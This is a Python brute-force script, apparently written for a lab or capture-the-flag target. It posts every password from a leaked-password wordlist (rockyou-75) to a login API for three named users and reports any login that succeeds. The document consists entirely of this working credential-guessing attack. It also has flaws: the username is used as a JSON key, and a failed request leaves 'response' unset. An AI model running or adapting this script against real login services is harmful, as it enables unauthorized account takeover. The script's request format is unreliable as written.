#!/usr/bin/env python3

import requests
from time import sleep

url = 'http://10.129.71.65:3000/api/session/authenticate'
usernames = ['tom', 'mark', 'rastating']

with open('/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou-75.txt', 'r') as wordlistFile:
	wordlist = wordlistFile.read().split('\n')

for name in usernames:
	print(f'[+] Attempting wordlist attack for {name}...')

	for i, password in enumerate(wordlist):
		try:
			response = requests.post(url, json={name:password}).text
		except:
			print(f'[-] Error on password: {password}')
			sleep(10)
		
		if 'Authentication failed' not in response:
			print(f'[+] Login - {name}:{password}')
			break
		else:
			if i % 100 == 0:
				print(f'Attempts for {name}: {i}')
